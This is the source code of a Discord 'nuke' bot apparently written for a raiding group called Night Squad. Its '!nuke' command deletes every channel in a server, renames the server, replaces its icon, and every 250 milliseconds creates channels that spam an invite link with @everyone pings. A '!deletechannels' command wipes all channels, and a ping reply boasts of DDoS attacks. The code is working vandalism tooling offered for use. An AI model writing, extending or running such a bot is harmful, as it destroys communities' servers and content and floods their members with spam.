const Discord = require('discord.js');
const fetch = require('node-fetch'); // add this line to use the fetch API

const client = new Discord.Client({
  intents: [
    Discord.Intents.FLAGS.GUILDS,
    Discord.Intents.FLAGS.GUILD_MESSAGES,
    Discord.Intents.FLAGS.GUILD_MEMBERS // add this line to enable the GUILD_MEMBERS intent
  ]
});

const prefix = '!';
const nukeMessage = 'nightSquad on top';
let intervalId = null; // store the interval ID so we can clear it later
const authorizedUsers = ['917970588142796810', '1077386018988228660', '812890856755036199']; // replace with the IDs of the users you want to allow
let oldServerName = null; // variable to store old server name
let nukeInProgress = false;

client.on('ready', () => {
  console.log(`Logged in as ${client.user.tag}!`);
});


client.on('message', message => {
  if (!authorizedUsers.includes(message.author.id)) return; // check if the user is authorized

  // ...




  
if (message.content.startsWith(prefix + 'serverphoto')) {
  const url = message.content.slice(prefix.length + 'serverphoto'.length + 1);
  if (!url) return message.reply('Please provide a valid URL.');

  fetch(url)
    .then(response => response.buffer())
    .then(buffer => {
      message.guild.setIcon(buffer)
        .then(() => message.reply('Server photo has been updated.'))
        .catch(error => {
          console.error(error);
          message.reply('Failed to update server photo.');
        });
    })
    .catch(error => {
      console.error(error);
      message.reply('Failed to fetch image from URL.');
    });
  }




  
  if (message.content === prefix + 'ping') {
    message.reply('D-doseados por sus dioses de night Squad');
  }

  if (message.content === prefix + 'deletechannels') {
    message.guild.channels.cache.forEach(channel => {
      channel.delete().catch(error => console.error(`Failed to delete channel ${channel.id}: ${error}`));
    });
  }

 if (message.content === prefix + 'nuke') {
  if (nukeInProgress) {
    message.channel.send('Sorry, a Nuke is already in progress.');
    return;
  }
  oldServerName = message.guild.name;

  // Set new server name and icon
  message.guild.setName('Night Squad RD').catch(error => console.error(`Failed to set server name: ${error}`));
  fetch('https://media.discordapp.net/attachments/1079164144462352474/1079167204957900820/Z.png')
    .then(response => response.buffer())
    .then(buffer => {
      message.guild.setIcon(buffer)
        .then(() => console.log('Server photo has been updated.'))
        .catch(error => console.error(`Failed to update server photo: ${error}`));
    })
    .catch(error => console.error(`Failed to fetch image from URL: ${error}`));

  // Delete all channels and create new ones
  message.guild.channels.cache.forEach(channel => {
    channel.delete().catch(error => console.error(`Failed to delete channel ${channel.id}: ${error}`));
  });
  intervalId = setInterval(() => {
    message.guild.channels.create(nukeMessage, { type: 'text' }).then(channel => {
      channel.send('https://discord.gg/F7KfmUXuFy @everyone @here');
    }).catch(error => console.error(`Failed to create channel: ${error}`));
  }, 250);
  nukeInProgress = true;
}

  
if (message.content === prefix + 'stopnuke') {
  if (nukeInProgress) {
    clearInterval(intervalId);
    message.guild.channels.cache.forEach(channel => {
      if (channel.name.startsWith(nukeMessage)) {
        channel.delete().catch(error => console.error(`Failed to delete channel ${channel.id}: ${error}`));
      }
    });
    message.guild.setName(oldServerName).catch(error => console.error(`Failed to set server name: ${error}`));
    message.channel.send('Nuke stopped.');
    nukeInProgress = false;
  } else {
    message.channel.send('There is no nuke in progress.');
  }
}

  if (message.content.startsWith(prefix + 'servername')) {
    const name = message.content.slice(prefix.length + 'servername'.length + 1);
    if (!name) return message.reply('Please provide a valid server name.');

    message.guild.setName(name)
      .then(() => message.reply(`Server name has been changed to "${name}".`))
      .catch(error => {
        console.error(error);
        message.reply('Failed to update server name.');
      });
  }
});

client.login('tutokenaca');
